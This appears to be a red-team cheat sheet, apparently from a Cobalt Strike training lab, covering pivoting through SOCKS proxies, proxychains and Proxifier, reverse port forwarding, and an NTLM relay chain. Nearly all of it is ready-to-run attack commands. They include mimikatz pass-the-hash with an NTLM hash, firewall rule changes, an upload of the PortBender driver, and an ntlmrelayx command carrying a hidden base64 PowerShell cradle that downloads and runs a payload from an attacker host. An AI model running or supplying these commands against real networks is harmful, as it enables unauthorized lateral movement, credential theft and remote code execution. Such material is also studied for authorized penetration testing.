# Pivoting

# Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)

    beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# Verify the SOCKS proxy on team server

    attacker@ubuntu ~> sudo ss -lpnt

# Configure Proxychains in Linux

    $ sudo vim /etc/proxychains.conf
    socks5 127.0.0.1 1080 socks_user socks_password

    $attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
    ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30

# Use Proxifier for Windows environment 

    ps> runas /netonly /user:dev/bfarmer mmc.exe
    ps> mimikatz # privilege::debug
    ps> mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
    PS C:\Users\Attacker> $cred = Get-Credential
    PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

# Use FoxyProxy plugin to access Webportal via SOCKS Proxy

# Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)

    beacon> rportfwd 8080 127.0.0.1 80
    beacon> run netstat -anp tcp
    ps> iwr -Uri http://wkstn-2:8080/a

    beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
    beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"

# NTLM Relay

1. Setup SOCKS Proxy on the beacon

        beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy

        $ sudo vim /etc/proxychains.conf
        socks5 127.0.0.1 1080 socks_user socks_password

3. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution

        $ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

# Encoded command: iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

4. Setup reverse port forwarding 

        beacon> rportfwd 8080 127.0.0.1 80
        beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its .cna file

        beacon> cd C:\Windows\system32\drivers
        beacon> upload C:\Tools\PortBender\WinDivert64.sys
        beacon> PortBender redirect 445 8445

6. Manually try to access share on our system or use MSPRN, Printspooler to force authentication

7. Verify the access in weblog and use link command to connect with SMB beacon

        beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
